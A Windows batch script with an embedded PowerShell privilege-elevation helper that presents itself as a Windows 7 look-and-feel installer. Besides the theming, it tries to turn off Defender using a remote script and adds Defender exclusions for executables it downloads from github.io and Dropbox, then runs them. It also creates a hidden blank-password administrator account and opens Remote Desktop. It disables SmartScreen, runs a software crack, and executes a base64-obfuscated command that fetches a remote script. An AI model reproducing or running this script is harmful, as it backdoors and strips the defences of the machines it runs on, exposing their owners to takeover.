@echo off
whoami /user | findstr /i /c:S-1-5-18 >nul || ( call :RunAsTI "%~f0" %* & exit /b )
goto :main
powershell exit !!^(Get-MpComputerStatus^).AMRunningMode
if not errorlevel 1 goto :main
powershell exit ^(Get-MpComputerStatus^).AMRunningMode -ne 'Not running'
if not errorlevel 1 goto :main
powershell exit ^(Get-MpComputerStatus^).IsTamperProtected
if errorlevel 1 (
  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
  start windowsdefender://threatsettings/
  powershell sleep 5; ^(New-Object -ComObject wscript.shell^).sendkeys^('{Tab}{Tab}{Tab}{Tab} '^);sleep 5
  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f
)
set 1=6&powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';irm 'github.com/AveYo/LeanAndMean/raw/main/ToggleDefender.bat'^|iex
:checkdefender
powershell exit ^(Get-MpComputerStatus^).AMRunningMode -ne 'Not running'
if errorlevel 1 (
  timeout /t 3 /nobreak >nul 2>&1
  goto :checkdefender
)
:main
if not exist "%WinDir%\system32\curl.exe" powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';iwr https://microtoolbox.github.io/curl.exe -OutFile "${env:windir}\system32\curl.exe"
curl https://dl.dropbox.com/scl/fi/4jxnzdrnajogkbbavb3pk/Get7.zip?rlkey=0b6fmko4buv2rv7q2gxt3hl3c -Lo "%temp%\Get7.zip"
powershell Add-MpPreference -ExclusionPath '%temp%\Get7\Windows\Win7Volume.exe'
powershell Add-MpPreference -ExclusionPath '%temp%\Get7\Windows\PENetwork.exe'
powershell Add-MpPreference -ExclusionPath '%temp%\Get7\WB11.exe'
powershell Expand-Archive -Force -Path '%temp%\Get7.zip' -DestinationPath '%temp%\Get7'
del /f /q "%temp%\Get7.zip"
cd /d "%temp%\Get7"
taskkill /f /im explorer.exe
powershell Add-MpPreference -ExclusionPath '%windir%\PENetwork.exe'
powershell Add-MpPreference -ExclusionPath '%windir%\Win7Volume.exe'
powershell Add-MpPreference -ExclusionPath '%programfiles(x86)%\ClassicLogonShell'
powershell Copy-Item -Path """$env:temp\Get7\Windows\*""" -Destination """$env:windir""" -Recurse -Force
powershell Copy-Item -Path """$env:temp\Get7\ClassicLogonShell""" -Destination """${env:programfiles(x86)}\""" -Recurse -Force
mkdir "%ProgramFiles(x86)%\ClassicLogonShell\flags"
icacls "%ProgramFiles(x86)%\ClassicLogonShell\flags" /T /C /grant Everyone:(OI)(CI)F
sc create "Classic Logon Shell Launcher Service" type= own start= auto error= ignore binpath= "%programfiles(x86)%\ClassicLogonShell\LauncherService.exe"
start explorer
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f
net user LogonHax /add
net localgroup Administrators /add LogonHax
net user LogonHax ""
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v LogonHax /t REG_DWORD /d 0 /f
curl --output "%TEMP%\ntrights.exe" "https://microtoolbox.github.io/ntrights.exe"
"%TEMP%\ntrights.exe" +r SeServiceLogonRight -u LogonHax
del /f /q "%TEMP%\ntrights.exe"
sc create LogonHax type= own start= auto error= ignore binpath= "%programfiles(x86)%\ClassicLogonShell\nssm.exe" obj= %computername%\LogonHax password= ""
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\logonhax\Parameters /v AppDirectory /t REG_SZ /d "C:\Program Files (x86)\ClassicLogonShell" /f
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\logonhax\Parameters /v Application /t REG_SZ /d "C:\Program Files (x86)\ClassicLogonShell\psexecl.exe" /f
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\logonhax\Parameters /v AppParameters /t REG_SZ /d "-accepteula -sx """C:\Program Files (x86)\ClassicLogonShell\logonhax2.exe"""" /f
powershell iex ^(^(iwr -UseBasicParsing https://github.com/AveYo/fox/raw/main/Edge_Removal.bat^).Content.replace^('-nop -noe', '-nop'^)^)
start /wait "" "%temp%\Get7\Win7Edge.exe" /silentinstall "%temp%\Get7\Win7Edge.ini"
pushd "%temp%\Get7\Win7Boot"
call "%temp%\Get7\Win7Boot\install768.bat"
popd
start /wait "" "%temp%\Get7\Win7Games.exe" /S
start /wait "" "%temp%\Get7\Win6Games.exe" /S
start /wait "" "%temp%\Get7\Win5Games.exe" /S
start /wait "" "%temp%\Get7\Win7Icons.exe"
start /wait "" msiexec /i "%temp%\Get7\winpuzzles.msi" /qb
reg import "%temp%\Get7\Win7Start.reg"
start /wait "" "%temp%\Get7\Win7Start.exe" /VERYSILENT /INSTALLER /NSD
reg import "%temp%\Get7\Win7Shell.reg"
start /wait "" "%temp%\Get7\Win7Shell.exe" /S
reg import "%temp%\Get7\Windows\OldNewExplorer\Win7Explorer.reg"
regsvr32 /s "%windir%\OldNewExplorer\OldNewExplorer64.dll"
regsvr32 /s "%windir%\OldNewExplorer\OldNewExplorer32.dll"
wsreset -i
wsreset -i
powercfg.exe -x -monitor-timeout-ac 0
powercfg.exe -x -monitor-timeout-dc 0
powercfg.exe -x -disk-timeout-ac 0
powercfg.exe -x -disk-timeout-dc 0
powercfg.exe -x -standby-timeout-ac 0
powercfg.exe -x -standby-timeout-dc 0
powercfg.exe -x -hibernate-timeout-ac 0
powercfg.exe -x -hibernate-timeout-dc 0
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "SearchboxTaskbarMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowTaskViewButton" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\People" /v "PeopleBand" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v "EnableAutoTray" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Bluetooth" /v "Notification Area Icon" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSecondsInSystemClock" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Control Panel\International" /v "sLongDate" /t REG_SZ /d "dddd d MMMM yyyy" /f
Reg.exe add "HKCU\Control Panel\International" /v "sShortDate" /t REG_SZ /d "ddd d MMM yyyy" /f
Reg.exe add "HKCU\Control Panel\International" /v "sTimeFormat" /t REG_SZ /d "hh:mm:ss tt" /f
Reg.exe add "HKCU\Control Panel\International" /v "sShortTime" /t REG_SZ /d "hh:mm:ss tt" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "link" /t REG_BINARY /d "00000000" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "LowRiskFileTypes" /t REG_SZ /d ".zip;.rar;.nfo;.txt;.exe;.bat;.vbs;.com;.cmd;.reg;.msi;.htm;.html;.gif;.bmp;.jpg;.avi;.mpg;.mpeg;.mov;.mp3;.m3u;.wav;" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "PreventOverride" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Edge\SmartScreenEnabled" /v "(Default)" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338393Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Privacy" /v "TailoredExperiencesWithDiagnosticDataEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableActivityFeed" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "RotatingLockScreenOverlayEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338387Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SilentInstalledAppsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSyncProviderNotifications" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\UserProfileEngagement" /v "ScoobeSystemSettingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Configuration Manager" /v "EnablePeriodicBackup" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Input\Settings" /v "EnableExpressiveInputShellHotkey" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".tif" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".tiff" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".bmp" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".dib" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".gif" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".jfif" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".jpe" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".jpeg" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".jpg" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".jxr" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".png" /t REG_SZ /d "PhotoViewer.FileAssoc.Tiff" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "VerboseStatus" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\MSIServer" /ve /t REG_SZ /d "Service" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\MSIServer" /ve /t REG_SZ /d "Service" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "SystemRestorePointCreationFrequency" /t REG_DWORD /d "0" /f
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Explorer" /v EnableLegacyBalloonNotifications /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v LastActiveClick /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLinkedConnections /t REG_DWORD /d 1 /f
powercfg /hibernate on
powercfg hibernate size 0
powercfg /h /type full
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v HiberbootEnabled /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
powershell Add-MpPreference -ExclusionPath '%ProgramFiles%\RDP Wrapper'
powershell Add-MpPreference -ExclusionPath '%temp%\RDPWInst.exe';[System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';iwr https://microtoolbox.github.io/RDPWInst.exe -OutFile "${env:temp}\RDPWInst.exe"
"%temp%\RDPWInst.exe" -i -o
del /f /q "%temp%\RDPWInst.exe"
curl --output "%TEMP%\WindowBlinds11_setup.exe" "https://microtoolbox.github.io/8d4ejv.com"
start /wait "" "%TEMP%\WindowBlinds11_setup.exe" /S
del /f /q "%TEMP%\WindowBlinds11_setup.exe"
powershell Add-MpPreference -ExclusionPath '%temp%\Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe'
powershell Add-MpPreference -ExclusionPath '%temp%\autocrack.exe'
curl --output "%TEMP%\Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe" "https://microtoolbox.github.io/Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe"
curl --output "%TEMP%\autocrack.exe" "https://microtoolbox.github.io/autocrack.exe"
start /wait "" "%TEMP%\autocrack.exe" "%TEMP%\Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe"
del /f /q "%TEMP%\Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe"
del /f /q "%TEMP%\autocrack.exe"
curl --output "%TEMP%\SkinStudio_10_setup_sd.exe" "https://microtoolbox.github.io/SkinStudio_10_setup_sd.exe"
start /wait "" "%TEMP%\SkinStudio_10_setup_sd.exe" /S
del /f /q "%TEMP%\SkinStudio_10_setup_sd.exe"
curl --output "%ProgramFiles(x86)%\Stardock\SkinStudio\SdDisplay.exe" "https://microtoolbox.github.io/SkinStudio_SdDisplay.exe"
curl --output "%TEMP%\Aero11.wba" "https://microtoolbox.github.io/Aero11.wba"
start /wait "" "%ProgramFiles(x86)%\Stardock\WindowBlinds\wbload.exe" "%TEMP%\Aero11.wba"
del /f /q "%TEMP%\Aero11.wba"
::start /wait "" "%temp%\Get7\WB11.exe"
curl --output "%TEMP%\WMC.zip" "https://microtoolbox.github.io/WMC.zip"
mkdir "%TEMP%\WMC"
tar -xf "%TEMP%\WMC.zip" -C "%TEMP%\WMC"
del /f /q "%TEMP%\WMC.zip"
call "%TEMP%\WMC\InstallerBLUE.cmd"
rd /s /q "%TEMP%\WMC"
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v LaunchTo /t REG_DWORD /d 1 /f
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer /v HubMode /t REG_DWORD /d 1 /f
reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{0DB7E03F-FC29-4DC6-9020-FF41B59E513A} /f
reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{0DB7E03F-FC29-4DC6-9020-FF41B59E513A} /f
::echo.^<Configuration^>^<Add OfficeClientEdition="64" Channel="Current"^>^<Product ID="MondoRetail"^>^<Language ID="en-US" /^>^<ExcludeApp ID="Groove" /^>^<ExcludeApp ID="Lync" /^>^<ExcludeApp ID="OneDrive" /^>^<ExcludeApp ID="Teams" /^>^</Product^>^</Add^>^<Display Level="Full" AcceptEULA="TRUE" /^>^<Updates Enabled="TRUE" Channel="Current" /^>^</Configuration^> > "%temp%\odtcfg.xml"&powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';iwr https://microtoolbox.github.io/odt.exe -OutFile "${env:temp}\odt.exe"&"%temp%\odt.exe" /configure "%temp%\odtcfg.xml"&del /f /q "%temp%\odt.exe"&del /f /q "%temp%\odtcfg.xml"
powershell -ec JgAgACgAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAoAGkAcgBtACAAaAB0AHQAcABzADoALwAvAG0AYQBzAHMAZwByAGEAdgBlAC4AZABlAHYALwBnAGUAdAApACkAKQAgAC8ASABXAEkARAAgAC8ATwBoAG8AbwBrAA==
reg import "%temp%\Get7\Win7Start.reg"
reg import "%temp%\Get7\Win7Battery.reg"
reg import "%temp%\Get7\Win7Network.reg"
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowStatusBar /t REG_DWORD /d 0 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v HideSCAMeetNow /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v HideSCANetwork /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v HideSCAPower /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer /v EnableLegacyBalloonNotifications /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Battery Mode" /t REG_SZ /d BatteryMode64 /f
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "PENetwork" /t REG_SZ /d PENetwork /f
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Classic Volume" /t REG_SZ /d Win7Volume /f
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Classic Taskbar Context Menu" /t REG_SZ /d "rundll32 TaskbarContextMenuTweaker.dll,Inject" /f
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "LogonHax User Mode Service" /t REG_SZ /d "C:\Program Files (x86)\ClassicLogonShell\LogonHax2.exe" /f
reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f
reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v SecurityHealth /f
reg add "HKEY_CURRENT_USER\SOFTWARE\VMware, Inc.\VMware Tools" /v ShowTray /t REG_DWORD /d 1 /f
del /f /q "%systemdrive%\Users\Public\Desktop\Windows Media Center.lnk"
del /f /q "%userprofile%\Desktop\Pinball.lnk"
start ms-settings:lockscreen
powershell sleep 10;(New-Object -ComObject wscript.shell).SendKeys('{TAB}{TAB}{TAB}{TAB}{ENTER}');sleep 1;(New-Object -ComObject wscript.shell).SendKeys('%windir%\logon.png{ENTER}')
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Personalization /v NoLockScreen /t REG_DWORD /d 1 /f
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Personalization /v LockScreenOverlaysDisabled /t REG_DWORD /d 1 /f
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Personalization /v NoChangingLockScreen /t REG_DWORD /d 1 /f
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Personalization /v NoLockScreenSlideshow /t REG_DWORD /d 1 /f
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Personalization /v LockScreenImage /t REG_SZ /d "%windir%\logon.png" /f
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System /v DisableAcrylicBackgroundOnLogon /t REG_DWORD /d 1 /f
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP /v LockScreenImagePath /t REG_SZ /d "%windir%\logon.png" /f
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP /v LockScreenImageUrl /t REG_SZ /d "%windir%\logon.png" /f
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP /v LockScreenImageStatus /t REG_DWORD /d 1 /f
icacls "C:\ProgramData\Microsoft\Windows\SystemData" /reset /t /c /l
::set 1=7&powershell irm 'github.com/AveYo/LeanAndMean/raw/main/ToggleDefender.bat'^|iex
regsvr32 "%ProgramFiles%\ExplorerPatcher\ExplorerPatcher.amd64.dll"

powershell.exe -executionpolicy unrestricted "%TEMP%\Get7\AntiSearch.ps1"
reg add "HKLM\Software\Classes\CLSID\{1d64637d-31e9-4b06-9124-e83fb178ac6e}\TreatAs" /f /ve /t REG_SZ /d "{64bc32b5-4eec-4de7-972d-bd8bd0324537}"
reg add "HKLM\Software\Classes\WOW6432Node\CLSID\{1d64637d-31e9-4b06-9124-e83fb178ac6e}\TreatAs" /f /ve /t REG_SZ /d "{64bc32b5-4eec-4de7-972d-bd8bd0324537}"
reg add "HKLM\Software\WOW6432Node\Classes\CLSID\{1d64637d-31e9-4b06-9124-e83fb178ac6e}\TreatAs" /f /ve /t REG_SZ /d "{64bc32b5-4eec-4de7-972d-bd8bd0324537}"
reg add "HKLM\SOFTWARE\Classes\CLSID\{8baaa930-ba82-40d9-9632-16fd947e6068}" /ve /t REG_SZ /d "ClassicSearch Address Bar Shrinker" /f
reg add "HKLM\SOFTWARE\Classes\CLSID\{8baaa930-ba82-40d9-9632-16fd947e6068}\InProcServer32" /ve /t REG_SZ /d "%windir%\System32\ClassicSearch64.dll" /f
reg add "HKLM\SOFTWARE\Classes\CLSID\{8baaa930-ba82-40d9-9632-16fd947e6068}\InProcServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKLM\SOFTWARE\WOW6432Node\Classes\CLSID\{8baaa930-ba82-40d9-9632-16fd947e6068}" /ve /t REG_SZ /d "ClassicSearch Address Bar Shrinker" /f
reg add "HKLM\SOFTWARE\WOW6432Node\Classes\CLSID\{8baaa930-ba82-40d9-9632-16fd947e6068}\InProcServer32" /ve /t REG_SZ /d "%windir%\System32\ClassicSearch32.dll" /f
reg add "HKLM\SOFTWARE\WOW6432Node\Classes\CLSID\{8baaa930-ba82-40d9-9632-16fd947e6068}\InProcServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKLM\SOFTWARE\Classes\WOW6432Node\CLSID\{8baaa930-ba82-40d9-9632-16fd947e6068}" /ve /t REG_SZ /d "ClassicSearch Address Bar Shrinker" /f
reg add "HKLM\SOFTWARE\Classes\WOW6432Node\CLSID\{8baaa930-ba82-40d9-9632-16fd947e6068}\InProcServer32" /ve /t REG_SZ /d "%windir%\System32\ClassicSearch32.dll" /f
reg add "HKLM\SOFTWARE\Classes\WOW6432Node\CLSID\{8baaa930-ba82-40d9-9632-16fd947e6068}\InProcServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{8baaa930-ba82-40d9-9632-16fd947e6068}" /v "NoInternetExplorer" /t REG_SZ /d "1" /f
reg add "HKLM\SOFTWARE\Classes\Drive\shellex\FolderExtensions\{8baaa930-ba82-40d9-9632-16fd947e6068}" /v "DriveMask" /t REG_DWORD /d "255" /f

timeout /t 5 /nobreak
shutdown /f /r /t 0
exit /b


#:RunAsTI snippet to run as TI/System, with innovative HKCU load, ownership privileges, high priority, and explorer support
set ^ #=& set "0=%~f0"& set 1=%*& powershell -c iex(([io.file]::ReadAllText($env:0)-split'#\:RunAsTI .*')[1])& exit /b
function RunAsTI ($cmd,$arg) { $id='RunAsTI'; $key="Registry::HKU\$(((whoami /user)-split' ')[-1])\Volatile Environment"; $code=@'
 $I=[int32]; $M=$I.module.gettype("System.Runtime.Interop`Services.Mar`shal"); $P=$I.module.gettype("System.Int`Ptr"); $S=[string]
 $D=@(); $T=@(); $DM=[AppDomain]::CurrentDomain."DefineDynami`cAssembly"(1,1)."DefineDynami`cModule"(1); $Z=[uintptr]::size
 0..5|% {$D += $DM."Defin`eType"("AveYo_$_",1179913,[ValueType])}; $D += [uintptr]; 4..6|% {$D += $D[$_]."MakeByR`efType"()}
 $F='kernel','advapi','advapi', ($S,$S,$I,$I,$I,$I,$I,$S,$D[7],$D[8]), ([uintptr],$S,$I,$I,$D[9]),([uintptr],$S,$I,$I,[byte[]],$I)
 0..2|% {$9=$D[0]."DefinePInvok`eMethod"(('CreateProcess','RegOpenKeyEx','RegSetValueEx')[$_],$F[$_]+'32',8214,1,$S,$F[$_+3],1,4)}
 $DF=($P,$I,$P),($I,$I,$I,$I,$P,$D[1]),($I,$S,$S,$S,$I,$I,$I,$I,$I,$I,$I,$I,[int16],[int16],$P,$P,$P,$P),($D[3],$P),($P,$P,$I,$I)
 1..5|% {$k=$_; $n=1; $DF[$_-1]|% {$9=$D[$k]."Defin`eField"('f' + $n++, $_, 6)}}; 0..5|% {$T += $D[$_]."Creat`eType"()}
 0..5|% {nv "A$_" ([Activator]::CreateInstance($T[$_])) -fo}; function F ($1,$2) {$T[0]."G`etMethod"($1).invoke(0,$2)}
 $TI=(whoami /groups)-like'*1-16-16384*'; $As=0; if(!$cmd) {$cmd='control';$arg='admintools'}; if ($cmd-eq'This PC'){$cmd='file:'}
 if (!$TI) {'TrustedInstaller','lsass','winlogon'|% {if (!$As) {$9=sc.exe start $_; $As=@(get-process -name $_ -ea 0|% {$_})[0]}}
 function M ($1,$2,$3) {$M."G`etMethod"($1,[type[]]$2).invoke(0,$3)}; $H=@(); $Z,(4*$Z+16)|% {$H += M "AllocHG`lobal" $I $_}
 M "WriteInt`Ptr" ($P,$P) ($H[0],$As.Handle); $A1.f1=131072; $A1.f2=$Z; $A1.f3=$H[0]; $A2.f1=1; $A2.f2=1; $A2.f3=1; $A2.f4=1
 $A2.f6=$A1; $A3.f1=10*$Z+32; $A4.f1=$A3; $A4.f2=$H[1]; M "StructureTo`Ptr" ($D[2],$P,[boolean]) (($A2 -as $D[2]),$A4.f2,$false)
 $Run=@($null, "powershell -win 1 -nop -c iex `$env:R; # $id", 0, 0, 0, 0x0E080600, 0, $null, ($A4 -as $T[4]), ($A5 -as $T[5]))
 F 'CreateProcess' $Run; return}; $env:R=''; rp $key $id -force; $priv=[diagnostics.process]."GetM`ember"('SetPrivilege',42)[0]
 'SeSecurityPrivilege','SeTakeOwnershipPrivilege','SeBackupPrivilege','SeRestorePrivilege' |% {$priv.Invoke($null, @("$_",2))}
 $HKU=[uintptr][uint32]2147483651; $NT='S-1-5-18'; $reg=($HKU,$NT,8,2,($HKU -as $D[9])); F 'RegOpenKeyEx' $reg; $LNK=$reg[4]
 function L ($1,$2,$3) {sp 'HKLM:\Software\Classes\AppID\{CDCBCFCA-3CDC-436f-A4E2-0E02075250C2}' 'RunAs' $3 -force -ea 0
  $b=[Text.Encoding]::Unicode.GetBytes("\Registry\User\$1"); F 'RegSetValueEx' @($2,'SymbolicLinkValue',0,6,[byte[]]$b,$b.Length)}
 function Q {[int](gwmi win32_process -filter 'name="explorer.exe"'|?{$_.getownersid().sid-eq$NT}|select -last 1).ProcessId}
 $11bug=($((gwmi Win32_OperatingSystem).BuildNumber)-eq'22000')-AND(($cmd-eq'file:')-OR(test-path -lit $cmd -PathType Container))
 if ($11bug) {'System.Windows.Forms','Microsoft.VisualBasic' |% {[Reflection.Assembly]::LoadWithPartialName("'$_")}}
 if ($11bug) {$path='^(l)'+$($cmd -replace '([\+\^\%\~\(\)\[\]])','{$1}')+'{ENTER}'; $cmd='control.exe'; $arg='admintools'}
 L ($key-split'\\')[1] $LNK ''; $R=[diagnostics.process]::start($cmd,$arg); if ($R) {$R.PriorityClass='High'; $R.WaitForExit()}
 if ($11bug) {$w=0; do {if($w-gt40){break}; sleep -mi 250;$w++} until (Q); [Microsoft.VisualBasic.Interaction]::AppActivate($(Q))}
 if ($11bug) {[Windows.Forms.SendKeys]::SendWait($path)}; do {sleep 7} while(Q); L '.Default' $LNK 'Interactive User'
'@; $V='';'cmd','arg','id','key'|%{$V+="`n`$$_='$($(gv $_ -val)-replace"'","''")';"}; sp $key $id $($V,$code) -type 7 -force -ea 0
 start powershell -args "-win 1 -nop -c `n$V `$env:R=(gi `$key -ea 0).getvalue(`$id)-join''; iex `$env:R" -verb runas
